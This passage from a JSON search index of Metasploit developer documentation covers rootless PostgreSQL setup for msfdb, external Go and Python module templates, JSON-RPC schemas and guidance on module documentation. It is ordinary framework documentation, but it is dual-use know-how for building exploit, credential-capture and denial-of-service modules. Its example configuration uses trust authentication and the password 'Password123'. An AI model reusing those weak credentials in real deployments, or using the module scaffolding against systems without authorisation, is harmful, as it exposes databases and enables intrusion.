run this program with root privileges . Requiring root privileges may be prohibitive to user installs of MSF. How can we create a cluster without root privileges? Adding the user to the postgres group and attempting to sudo -u postgres the command, however, resulted in the same error message. Looking closer at the various commands and discovered the following in the man page for pg_wrapper. PG_CLUSTER_CONF_ROOT This specifies an alternative base directory for cluster configurations. This is usually /etc/postgresql/, but for testing/development purposes you can change this to point to e. g. your home directory, so that you can use the postgresql-common tools without root privileges. Working Solution . Create cluster (“initdb”) to set up the necessary configuration structure: . Note, running mkdir -p $HOME/.local/etc/postgresql; before the pg_createcluster command didn’t stop the “install: cannot change owner and permissions of ‘/home/msfdev/.local/etc/postgresql/9.6’: Operation not permitted” message from appearing. This appears to be a warning only and doesn’t seem to affect cluster creation. mkdir -p $HOME/.local/var/log/postgresql; PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_createcluster --user=$(whoami) --datadir=$HOME/msf-db-datadir --socketdir=$HOME/.local/var/run/postgresql --logfile=$HOME/.local/var/log/postgresql/postgresql-version-msf.log --encoding=UTF8 9.6 msf -- --username=$(whoami) --auth-host=trust --auth-local=trust install: cannot change owner and permissions of '/home/msfdev/.local/etc/postgresql/9.6': Operation not permitted Creating new cluster 9.6/msf ... config /home/msfdev/.local/etc/postgresql/9.6/msf data /home/msfdev/msf-db-datadir locale en_US.UTF-8 socket /home/msfdev/.local/var/run/postgresql port 5433 . Check cluster was successfully created and appears in the list of all available clusters: . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 down msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log . Start postmaster server for the cluster (“pg_ctl”): . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf start . Check that the cluster was successfully started: . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 online msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log . Perform msfdb’s write_db_config method work by manually creating the ~/.msf4/database.yml file: . development: &amp;pgsql adapter: postgresql database: msf username: msf password: Password123 host: 127.0.0.1 port: 5433 pool: 200 production: &amp;production &lt;&lt;: *pgsql test: &lt;&lt;: *pgsql database: msftest username: msftest password: Password123 . Create database users: . Note, these steps are from msfdb’s init_db method. The following example only creates the main MSF user account and not the test account. PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"create user msf with password 'Password123';\" postgres CREATE ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"alter role msf createdb;\" postgres ALTER ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"alter role msf with password 'Password123';\" postgres ALTER ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql createdb --cluster 9.6/msf -O msf -h 127.0.0.1 -U msf -E UTF-8 -T template0 msf . Perform msfdb’s write_db_client_auth_config method work, except it needs to write the pg_hba.conf file now stored in under PG_CLUSTER_CONF_ROOT and inside the version/cluster-name directory. In this example that location is: $HOME/.local/etc/postgresql/9.6/msf/pg_hba.conf. Perform msfdb’s restart_db method work, by stopping and then starting the server. Stop and then start postmaster server for the cluster (“pg_ctl”): . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf stop PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf start . Check that the cluster was successfully started: . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 online msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log . Create initial database schema: . Note, these steps are from msfdb’s init_db method. cd ~/metasploit-framework bundle exec rake db:migrate . Start msfconsole and verify postgresql connection using the db_status command: . # disable or remove ~/.msf4/config if it is configured to auto connect to a data service mv ~/.msf4/config ~/.msf4/config.disable ./msfconsole ... msf5 &gt; db_status [*] Connected to msf. Connection type: postgresql. Drop (delete) the cluster: . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_dropcluster 9.6 msf . ",
    "url": "/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html#msfdb-support-for-postgresql-common",
    "relUrl": "/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html#msfdb-support-for-postgresql-common"
  },"613": {
    "doc": "Work needed to allow msfdb to use postgresql common",
    "title": "Work needed to allow msfdb to use postgresql common",
    "content": " ",
    "url": "/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html",
    "relUrl": "/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html"
  },"614": {
    "doc": "Writing GoLang Modules",
    "title": "Writing GoLang Modules",
    "content": "Contributing modules in GO can be achieved in a few simple steps as outlined below. As for supported GO version, we have tested with 1.11.2, no promised for version 2. 1. Location . | Select the appropriate module path based on the type of module you are trying to contribute | Be sure to include appropriate module documentation under here | Test your documentation is correct by executing info -d | . 2. Execution . | Include this line at the top of your module: //usr/bin/env go run \"$0\" \"$@\"; exit \"$?\" | Ensure your file is an executable file | . 3. Setup . | Initialize your module with the module metadata: import \"metasploit/module\" func main() { metadata := &amp;module.Metadata{ Name: \"&lt;module name\", Description: \"&lt;describe&gt;\", Authors: []string{\"&lt;author 1&gt;\", \"&lt;author 2&gt;\"}, Date: \"&lt;date module written\", Type:\"&lt;module type&gt;\", Privileged: &lt;true|false&gt;, References: []module.Reference{}, Options: map[string]module.Option{ \"&lt;option 1\": {Type: \"&lt;type&gt;\", Description: \"&lt;description&gt;\", Required: &lt;true|false&gt;, Default: \"&lt;default&gt;\"}, \"&lt;option 2\": {Type: \"&lt;type&gt;\", Description: \"&lt;description&gt;\", Required: &lt;true|false&gt;, Default: \"&lt;default&gt;\"}, }} module.Init(metadata, &lt;the entry method to your module&gt;) } . | . FULL EXAMPLE . Note: Above does not outline the full potential list of metadata options . Currently supported module types: . | remote_exploit | remote_exploit_cmd_stager | capture_server | dos | single_scanner | single_host_login_scanner | multi_scanner | . 4. Shared Code . | For code that is shared specific to your module create a directory in your module directory: shared/src/ metasploit will automatically add these to the GOPATH | For code that you think could be used across modules, add code here | 3rd party libs aren’t currently supported but we welcome patches | . 5. Finalize . | Test your Pull Request | Create a Pull Request | No coding standard here, be sure to gofmt | . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-golang-modules.html",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-golang-modules.html"
  },"615": {
    "doc": "Overview",
    "title": "Request Flow",
    "content": "Each time Metasploit wants an external module to do something (ex. describe itself or run with a certain configuration), it runs the module in a new process and talks to it over stdin/stdout. To get the metadata from a module (which includes options), the call sequence looks a bit like: . +------------+ | Metasploit | | Describe yourself +-------------------+ | +-------------------&gt; | some_module.py | | | | | | Some metadata | | &lt;-------------------+ | | | | +-------------------+ | | +------------+ . A module run might look like: . +------------+ | Metasploit | Do a thing with | these options +-------------------+ | +-------------------&gt; | some_module.py | | | | | | A bit of status | | &lt;-------------------+ | | | | Moar status | | &lt;-------------------+ | | | | I found a thing | | &lt;-------------------+ | | | | +-------------------+ | +------------+ . When a module meant for a single host is run against a range of hosts, Metasploit will start a new process for each host. If the THREADS datastore option is set and it is an auxiliary module, that many processes will be run at the same time. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#request-flow",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#request-flow"
  },"616": {
    "doc": "Overview",
    "title": "JSON-RPC API",
    "content": "External modules communicate with Metasploit over stdin/stdout. The methods a module must implement are describe and run; additional methods can be advertised in the capabilities array, for now assumed to use a subset of the options used for run. Metasploit implements message and will implement report in the near future. The specs for each method are written below using JSON-schema. Work still needs to be done enumerating valid types and codes for the messages. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#json-rpc-api",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#json-rpc-api"
  },"617": {
    "doc": "Overview",
    "title": "Describe",
    "content": "Request . { \"$schema\": \"http://json-schema.org/schema#\", \"type\": \"object\", \"required\": [\"params\", \"method\", \"jsonrpc\", \"id\"], \"properties\": { \"jsonrpc\": {\"enum\": [\"2.0\"]}, \"id\": {\"type\": \"string\"}, \"method\": {\"enum\": [\"describe\"]}, \"params\": {\"type\": \"object\"} } } . Response . { \"$schema\": \"http://json-schema.org/schema#\", \"type\": \"object\", \"required\": [\"jsonrpc\", \"result\", \"id\"], \"properties\": { \"jsonrpc\": {\"enum\": [\"2.0\"]}, \"id\": {\"type\": \"string\"}, \"result\": { \"type\": \"object\", \"required\": [\"name\", \"description\", \"authors\", \"type\", \"options\", \"capabilities\"], \"properties\": { \"name\": {\"type\": \"string\"}, \"description\": {\"type\": \"string\"}, \"authors\": {\"type\": \"array\", \"items\": {\"type\": \"string\"}}, \"date\": {\"type\": \"string\"}, \"references\": { \"type\": \"array\", \"items\": { \"type\": \"object\", \"required\": [\"type\", \"ref\"], \"properties\": { \"type\": {\"type\": \"string\"}, \"ref\": {\"type\": \"string\"} } } }, \"type\": {\"enum\": [\"remote_exploit.cmd_stager.wget\"]}, \"privileged\": {\"type\": \"boolean\"}, \"targets\": { \"type\": \"array\", \"items\": { \"type\": \"object\", \"required\": [\"platform\", \"arch\"], \"properties\": { \"platform\": {\"type\": \"string\"}, \"arch\": {\"type\": \"string\"} } } }, \"options\": { \"type\": \"object\", \"additionalProperties\": false, \"patternProperties\": { \"^[^=]*$\": { \"type\": \"object\", \"required\": [\"type\", \"description\", \"required\", \"default\"], \"properties\": { \"required\": {\"type\": \"boolean\"}, \"default\": {\"type\": [\"null\", \"string\", \"number\", \"boolean\", \"object\", \"array\"]}, \"description\": {\"type\": \"string\"}, \"type\": {\"type\": \"string\"} } } } }, \"capabilities\": { \"type\": \"array\", \"items\": { \"type\": \"string\" } } } } } } . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#describe",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#describe"
  },"618": {
    "doc": "Overview",
    "title": "Run",
    "content": "Request . { \"$schema\": \"http://json-schema.org/schema#\", \"type\": \"object\", \"required\": [\"params\", \"method\", \"jsonrpc\", \"id\"], \"properties\": { \"jsonrpc\": {\"enum\": [\"2.0\"]}, \"id\": {\"type\": \"string\"}, \"method\": {\"enum\": [\"run\"]}, \"params\": { \"type\": \"object\" \"additionalProperties\": false, \"patternProperties\": { \"^[^=]*$\": { \"type\": \"object\", \"required\": [\"type\", \"description\", \"required\", \"default\"], \"properties\": { \"required\": {\"type\": \"boolean\"}, \"default\": {\"type\": [\"null\", \"string\", \"number\", \"boolean\", \"object\", \"array\"]}, \"description\": {\"type\": \"string\"}, \"type\": {\"type\": \"string\"} } } } } } } . Response . { \"$schema\": \"http://json-schema.org/schema#\", \"type\": \"object\", \"required\": [\"jsonrpc\", \"id\"], \"properties\": { \"jsonrpc\": {\"enum\": [\"2.0\"]}, \"id\": {\"type\": \"string\"}, \"result\": { \"type\": \"object\", \"required\": [\"message\"] \"properties\": { \"message\": {\"type\": \"string\"}, \"return\": {\"type\": \"string\"} } }, \"error\": { \"type\": \"object\", \"required\": [\"message\", \"code\"], \"properties\": { \"message\": {\"type\": \"string\"}, \"code\": {\"type\": \"number\"}, \"data\": {\"type\": \"object\"} } } } } . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#run",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#run"
  },"619": {
    "doc": "Overview",
    "title": "Message",
    "content": "Notification - no response . { \"$schema\": \"http://json-schema.org/schema#\", \"type\": \"object\", \"required\": [\"params\", \"method\", \"jsonrpc\"], \"properties\": { \"jsonrpc\": {\"enum\": [\"2.0\"]}, \"method\": {\"enum\": [\"message\"]}, \"params\": { \"type\": \"object\", \"required\": [\"level\", \"message\"], \"properties\": { \"level\": {\"enum\": [\"error\", \"good\", \"warning\", \"info\", \"debug\"]}, \"message\": {\"type\": \"string\"} } } } } . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#message",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html#message"
  },"620": {
    "doc": "Overview",
    "title": "Overview",
    "content": "For an introduction to the reasons and goals for external modules, see our 2017 HaXmas post on the subject. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html"
  },"621": {
    "doc": "Writing Python Modules",
    "title": "Writing Python Modules for Metasploit",
    "content": "This is an example of how to write a Python module for Metasploit Framework that uses a Python metasploit library to communicate with framework via JSON-RPC over stdin/stdout. External Python modules should support Python versions 3.5 and newer. Python 2.7 is no longer used for external modules. Execution . | Include this line at the top of your module: #!/usr/bin/env python3 | Ensure your file is marked as executable | . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#writing-python-modules-for-metasploit",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#writing-python-modules-for-metasploit"
  },"622": {
    "doc": "Writing Python Modules",
    "title": "Python Library",
    "content": "The library currently supports a few function calls that can be used to report information to Metasploit Framework. The metasploit library can be loaded into your Python module by including the following line: . from metasploit import module . The location of the metasploit library is automatically added to the PYTHONPATH environment variable before the Python module is executed. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#python-library",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#python-library"
  },"623": {
    "doc": "Writing Python Modules",
    "title": "Describe Yourself",
    "content": "Metasploit modules include information about authors of the modules, references to other sources with information about the vulnerabilities, descriptions of the modules, options, etc. Python modules need to include this metadata information as well. The structure of the data is similar to modules written in Ruby. The following is an example template of metadata information: . metadata = { 'name': '&lt;name&gt;', 'description': ''' &lt;description&gt; ''', 'authors': [ '&lt;author&gt;', '&lt;author&gt;' ], 'date': 'YYYY-MM-DD', 'license': '&lt;license&gt;', 'references': [ {'type': 'url', 'ref': '&lt;url&gt;'}, {'type': 'cve', 'ref': 'YYYY-#'}, {'type': 'edb', 'ref': '#'}, {'type': 'aka', 'ref': '&lt;name&gt;'} ], 'type': '&lt;module type&gt;', 'options': { '&lt;name&gt;': {'type': 'address', 'description': '&lt;description&gt;', 'required': &lt;True/False&gt;, 'default': None}, '&lt;name&gt;': {'type': 'string', 'description': '&lt;description&gt;', 'required': &lt;True/False&gt;, 'default': None}, '&lt;name&gt;': {'type': 'string', 'description': '&lt;description&gt;', 'required': &lt;True/False&gt;, 'default': None} } } . Module Type . As shown in the metadata template information, a type is also include for the module. The module type is used to select an ERB template, which generates a Ruby document for the module. The ERB templates can be found here. The following templates are currently available: . remote_exploit_cmd_stager capture_server dos single_scanner multi_scanner . The remote_exploit_cmd_stager module type is used when writing an exploit for command execution or code injection vulnerabilities and provides the command to inject into the vulnerable code based on the flavor specified for the command stager. The capture_server module type is used when a module is designed to simulate a service to capture credentials for connecting clients. The dos module type is used when the module will send packets to a remote service that will crash the service or put it in an unusable state. The single_scanner module type is used when creating a module to scan hosts without batching. The multi_scanner module type is used for modules that are going to scan hosts in batches. The batch_size option is registered in the mutli_scanner ERB template with a default of 200. Options . The options dictionary in the metadata are the options that will be available in msfconsole when the module is loaded. The options can be required (necessary for the module to run) or not (provide additional functionality). Communication . To pass the metadata information, as well as the starting function of your Python module, to msfconsole, use the module.run() function. The module.run() function takes two arguments, the first is the metadata and the second is the callback function to use when executing the module from msfconsole. The code snippet will look like the following: . def run(args): # Your code here pass if __name__ == '__main__': module.run(metadata, run) . When msfconsole sends a describe request to the Python module, the metadata information is returned. When msfconsole sends a run request to the module, the callback function, run in this example, will be called with the arguments provided to msfconsole. A LogHandler can be setup and used to communicate status information back to framework during execution of the Python module. Here is code snippet that uses the LogHandler: . import logging from metasploit import module module.LogHandler.setup(msg_prefix='logging test: ') logging.info('info') logging.error('error') logging.warning('warning') logging.debug('debug') . The module.LogHandler.setup() function is used the create a Handler and Formatter that will call module.log() with the appropriate log level. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#describe-yourself",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#describe-yourself"
  },"624": {
    "doc": "Writing Python Modules",
    "title": "Full Example",
    "content": "#!/usr/bin/env python3 # -*- coding: utf-8 -*- # standard modules import logging # extra modules dependencies_missing = False try: import requests except ImportError: dependencies_missing = True from metasploit import module metadata = { 'name': 'Python Module Example', 'description': ''' Python communication with msfconsole. ''', 'authors': [ 'Jacob Robles' ], 'date': '2018-03-22', 'license': 'MSF_LICENSE', 'references': [ {'type': 'url', 'ref': 'https://blog.rapid7.com/2017/12/28/regifting-python-in-metasploit/'}, {'type': 'aka', 'ref': 'Coldstone'} ], 'type': 'single_scanner', 'options': { 'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'}, 'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None} } } def run(args): module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost'])) if dependencies_missing: logging.error('Module dependency (requests) is missing, cannot continue') return # Your code here try: r = requests.get('https://{}/{}'.format(args['rhost'], args['targeturi']), verify=False) except requests.exceptions.RequestException as e: logging.error('{}'.format(e)) return logging.info('{}...'.format(r.text[0:50])) if __name__ == '__main__': module.run(metadata, run) . The example sends a get request to the given rhost and targeturi, then calls logging.info() on the result to have the output displayed in msfconsole. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#full-example",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#full-example"
  },"625": {
    "doc": "Writing Python Modules",
    "title": "Coding with Style",
    "content": "All the Python code in Metasploit aims to be PEP 8 compliant. The biggest differences coming from Metasploit’s Ruby style: . | Two lines between functions (but not class methods) | Two lines between different types of code (like imports and the metadata, see above) | Four spaces for indenting | . Some coding choices to think about when writing your module: . | Prefer \"foo {}\".format('bar') over interpolation with % | Keep your callback methods short and readable. If it gets cluttered, break out sub-tasks into well-named functions | Variable names should be descriptive, readable, and short (a guide) | If you really need Python3 features in your module, use #!/usr/bin/env python3 for the shebang | If you have a lot of legacy code in 2.7 or need a 2.7 library, use #!/usr/bin/env python2.7 (macOS in particular does not ship with a python2 executable by default) | If possible, have your module compatible with both and use #!/usr/bin/env python | . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#coding-with-style",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#coding-with-style"
  },"626": {
    "doc": "Writing Python Modules",
    "title": "(Potentially) Common Questions",
    "content": "Why doesn’t the module appear when I search for it in msfconsole? . The module may have errors and fail to load inside of msfconsole. Check the framework log file, ~/.msf4/logs/framework.log, for error messages. Also, if the module is not marked as executable, then it will not show up when you search for it in msfconsole. Why is the output from the Python module not showing up in msfconsole? . The external modules communicate with framework via JSON-RPC. If your Python module contains print statements, framework may not recognize those as JSON-RPC requests. Use the LogHandler or module.log() to send status information, which will be displayed in msfconsole. ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#potentially-common-questions",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#potentially-common-questions"
  },"627": {
    "doc": "Writing Python Modules",
    "title": "Additional Resources",
    "content": "Rapid7 Blog: Regifting Python in Metasploit . Rapid7 Blog: External Metasploit Modules: The Gift That Keeps On Slithering . Metasploit Python library . ERB Templates . ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#additional-resources",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html#additional-resources"
  },"628": {
    "doc": "Writing Python Modules",
    "title": "Writing Python Modules",
    "content": " ",
    "url": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html",
    "relUrl": "/docs/development/developing-modules/external-modules/writing-external-python-modules.html"
  },"629": {
    "doc": "Writing Module Documentation",
    "title": "Writing Module Documentation",
    "content": "Adding and reviewing module documentation is a great way to contribute to the Metasploit Framework. Before you write any module documentation, you should take a look at the sample template, module_doc_template.md, or take a look at any of the KBs that are already available. Writing a KB . To write a KB, you’ll need to: . | Create a markdown (.md) file. | Write the content. | Save the file and name it after the module name. For example, the filename for ms08-067 is modules/exploits/windows/smb/ms08_067_netapi.rb, so its documentation is documentation/modules/exploits/windows/smb/ms08_067_netapi.md. | Place it in the metasploit-framework/documentation/modules directory. | . Where to put the markdown files . If you go to metasploit-framework/documentation/modules, you’ll see that there are documentation directories for each module type: auxiliary, exploit, payload, and post. To figure out where you need to put the file, you’ll need to look at the module’s path. | Start msfconsole. | Type use &lt;module name&gt;. | Type info -d. | When the module name appears, look at the Module field. You’ll see a file path for the module. That’s the path where the KB needs to be added. | . For example: . msf&gt; use auxiliary/scanner/smb/smb_login msf (smb_login)&gt; info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you’d add it to metasploit-framework/documentation/modules/auxiliary/smb.md. Sections you should include in the KB . These are just suggestions, but it’d be nice if the KB had these sections: . | Vulnerable Applications - Tells users what targets are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. | Verification Steps - Tells users how to use the module and what the expected results are from running the module. | Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. | Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module. | . ",
    "url": "/docs/development/quality/writing-module-documentation.html",
    "relUrl": "/docs/development/quality/writing-module-documentation.html"
  }
}
